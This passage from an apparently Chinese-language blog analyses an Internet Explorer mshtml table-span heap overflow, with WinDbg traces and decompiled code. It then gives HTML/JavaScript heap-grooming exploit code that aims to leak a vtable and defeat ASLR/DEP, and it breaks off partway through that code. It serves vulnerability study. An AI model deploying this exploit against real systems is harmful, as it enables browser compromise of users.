class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; bp mshtml!CTableCol::GetAAspan</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 2 hit</span><br><span class="line">eax=08776fd0 ebx=088faea8 ecx=00000031 edx=00000000 esi=08c76fac edi=08776fd0</span><br><span class="line">eip=68bfa007 esp=0460d874 ebp=0460d914 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableCol::GetAAspan:</span><br><span class="line">68bfa007 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; gu</span><br><span class="line">eax=000003e8 ebx=088faea8 ecx=00000002 edx=08d2dff0 esi=08c76fac edi=08776fd0</span><br><span class="line">eip=68e05a33 esp=0460d878 ebp=0460d914 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x383:</span><br><span class="line">68e05a33 3de8030000      cmp     eax,3E8h</span><br></pre></td></tr></table></figure><p></p><p>发现执行完此函数后，返回值(eax)的值已经变为了0x3e8，即POC中所设置的1000</p><p>再在函数<code>mshtml!CWidthUnitValue::GetPixelWidth</code>处下断<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; bp mshtml!CWidthUnitValue::GetPixelWidth</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=0047e278 ebx=00442380 ecx=004ee070 edx=004af208 esi=0249e2d8 edi=00000001</span><br><span class="line">eip=66ce63d8 esp=0249df9c ebp=0249e044 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CWidthUnitValue::GetPixelWidth:</span><br><span class="line">66ce63d8 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; gu</span><br><span class="line">eax=00001405 ebx=00442380 ecx=004ee070 edx=00000014 esi=0249e2d8 edi=00000001</span><br><span class="line">eip=66f35ab8 esp=0249dfa8 ebp=0249e044 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x459:</span><br><span class="line">66f35ab8 837da400        cmp     dword ptr [ebp-5Ch],0 ss:0023:0249dfe8=00000000</span><br></pre></td></tr></table></figure><p></p><p>可以看到返回值为(eax)为0x1405，该返回值为poc中col标签中的<code>width * 125</code><br>（注：《漏洞战争》和其他师傅的博客中该值都为<code>width * 100</code>，可能是系统配置的原因。。我也很绝望啊）</p><p>接下来回到让程序崩溃的地方<br></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">v158 = CTableCell::GetAAcolSpan(v29);</span><br><span class="line">...</span><br><span class="line">v153 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( v158 &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v99 = <span class="number">28</span> * v156;</span><br><span class="line">  v144 += v158;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">28</span> * v156; ; v99 = i )</span><br><span class="line">  &#123;</span><br><span class="line">    v149 = (<span class="keyword">const</span> struct CWidthUnitValue **)(v99 + *((_DWORD *)v37 + <span class="number">39</span>));</span><br><span class="line">    <span class="keyword">if</span> ( v151 &amp;&amp; v158 &gt; <span class="number">1</span> &amp;&amp; v153 == (CTableLayout *)(v158 - <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v100 = (_DWORD)v155 * (v158 - <span class="number">1</span>);</span><br><span class="line">      v99 = v147 - v100;</span><br><span class="line">      v155 = (struct CWidthUnitValue *)(v147 - v100);</span><br><span class="line">    &#125;</span><br><span class="line">    CTableColCalc::AdjustForCol(</span><br><span class="line">      (CTableColCalc *)v99,</span><br><span class="line">      (<span class="keyword">const</span> struct CWidthUnitValue **)v145,</span><br><span class="line">      v149,</span><br><span class="line">      v155,</span><br><span class="line">      a3,</span><br><span class="line">      v143,</span><br><span class="line">      (<span class="keyword">int</span>)v125);</span><br><span class="line">    v153 = (CTableLayout *)((<span class="keyword">char</span> *)v153 + <span class="number">1</span>);</span><br><span class="line">    i += <span class="number">28</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v153 &gt;= v158 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>程序将会循环调用<code>CTableColCalc::AdjustForCol</code>，调用次数由<code>v158</code>控制，即调用<code>spannum</code>次<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=004793d0 ebx=00421110 ecx=0000001c edx=00000014 esi=00450ffc edi=00000001</span><br><span class="line">eip=670bf152 esp=0235daa0 ebp=0235db4c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">670bf152 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd 450fe0</span><br><span class="line">00450fe0  00001405 00001405 00001405 00000000 </span><br><span class="line">00450ff0  0045f2d0 00000000 00014058 00000000</span><br><span class="line">00451000  004604a0 00000004 00000000 004307f8</span><br><span class="line">00451010  00000000 00431298 00000000 00000011</span><br><span class="line">00451020  00000012 ffffffff 003b74ec 00000000</span><br><span class="line">00451030  00000017 00000017 003b74b8 00000005</span><br><span class="line">00451040  004432a4 003b74b8 00450c50 0000000d</span><br><span class="line">00451050  323f985f 8000f2d0 003a005c 0055005c</span><br><span class="line">0:005&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=004793d0 ebx=00421110 ecx=00000038 edx=00000014 esi=00451018 edi=00000001</span><br><span class="line">eip=670bf152 esp=0235daa0 ebp=0235db4c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">670bf152 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd 450fe0</span><br><span class="line">00450fe0  00001405 00001405 00001405 00000000</span><br><span class="line">00450ff0  0045f2d0 00000000 00014058 00001405 </span><br><span class="line">00451000  00001405 00001405 00000000 004307f8</span><br><span class="line">00451010  00000000 00014058 00000000 00000011</span><br><span class="line">00451020  00000012 ffffffff 003b74ec 00000000</span><br><span class="line">00451030  00000017 00000017 003b74b8 00000005</span><br><span class="line">00451040  004432a4 003b74b8 00450c50 0000000d</span><br><span class="line">00451050  323f985f 8000f2d0 003a005c 0055005c</span><br></pre></td></tr></table></figure><p></p><p>可以看到，每次执行都会将<code>GetPixelWidth函数</code>获取的<code>0x1405</code>复制到该片内存中。<br>由于spannum已经被修改为1000，所以会覆盖到1000 * 0x1c大小的空间。<br>而堆块大小只有0x70，所以一定会导致堆溢出，从而crash。</p><h2 id="poc总结"><a href="#poc总结" class="headerlink" title="poc总结"></a>poc总结</h2><ol><li>在首次调用<code>CTableLayout::CalculateMinMax</code>时，由于<code>spannum == 1</code>、<code>spancmp == 0</code>，从而调用<code>CImplAry::EnsureSizeWorker</code>函数，分配了<code>4*0x1c == 0x70</code>大小的内存块</li><li>poc中通过js修改了span值之后，再次调用<code>CTableLayout::CalculateMinMax</code>时，<code>spannum == 1</code>、<code>spancmp == 4</code>，由于满足<code>spannum &lt;= spancmp/4</code>，所以发生跳转，没有重新分配内存块。</li><li>在<code>CTableColCalc::AdjustForCol</code>函数中，因为<code>spannum</code>被修改为1000，所以将要写入的内存区域远远超过分配好的区域，造成溢出。</li></ol><h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><h2 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h2><p><img src="/post/b72ee585/layout.png" alt="layout.png"><br>这里的主要思想是构造如图所示内存布局，首先创建大小为0x100的字符串”EEEE…”，接着是同等大小的”AAAA…”和”BBBB…”，最后创建一个Button元素，即CButtonLayout对象。<br>然后再释放掉字符串”EEEE…”所在的空间，造成内存中间隔着的0x100大小的空位。<br>这些空位就是为了在之后分配可溢出的内存块时能够占用其中的一个，当溢出时就能够覆盖到后面的”AAAA…”和”BBBB…”字符串。</p><p>因为这些字符串在IE浏览器中都是以BSTR的格式进行储存的，即:<br><code>4bytes字符串长度 + 字符串数据 + \x00\x00(2bytes)</code></p><p>所以如果能够覆盖掉4字节的字符串长度数据，将它修改为一个较大的值，就能够有效的泄露出位于后方的数据(CButtonLayout的虚表指针)。<br>如果泄露出<code>CButtonLayout的虚表指针</code>，就可以通过固定的偏移值计算出mshtml.dll在程序中加载的基址。<br>接下来就可以通过ROP绕过DEP和ASLR了。</p><h3 id="布局代码"><a href="#布局代码" class="headerlink" title="布局代码"></a>布局代码</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"evil"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> free = <span class="string">"EEEE"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (free.length &lt; <span class="number">480</span>) free += free;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> string1 = <span class="string">"AAAA"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (string1.length &lt; <span class="number">480</span>) string1 += string1;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> string2 = <span class="string">"BBBB"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (string2.length &lt; <span class="number">480</span>) string2 += string2;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> fr = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> al = <span class="keyword">new</span> <span class="built_in">Array</span>();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> div_container = <span class="built_in">document</span>.getElementById(<span class="string">"evil"</span>);</span></span><br><span class="line"><span class="javascript">        div_container.style.cssText = <span class="string">"display:none"</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">500</span>; i+=<span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="undefined">            fr[i] = free.substring(0, (0x100 - 6) / 2);</span></span><br><span class="line"><span class="undefined">            al[i] = string1.substring(0, (0x100 - 6) / 2);</span></span><br><span class="line"><span class="undefined">            al[i+1] = string2.substring(0, (0x100 - 6) / 2);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> obj = <span class="built_in">document</span>.createElement(<span class="string">"button"</span>);</span></span><br><span class="line"><span class="undefined">            div_container.appendChild(obj);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//alert(1);</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">200</span>; i &lt; <span class="number">500</span>; i += <span class="number">2</span>) &#123;</span></span><br><span class="line"><span class="javascript">            fr[i] = <span class="literal">null</span>; </span></span><br><span class="line"><span class="javascript">            CollectGarbage(); <span class="comment">//释放"EEEE..."字符串</span></span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"1"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"2"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"3"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"5"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"6"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"7"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"8"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"9"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"10"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"11"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"12"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"13"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"14"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"15"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"16"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"17"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"18"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"19"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"20"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"21"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"22"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"23"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"24"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"25"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"26"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"27"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"28"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"29"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"30"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"31"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"32"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"33"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span 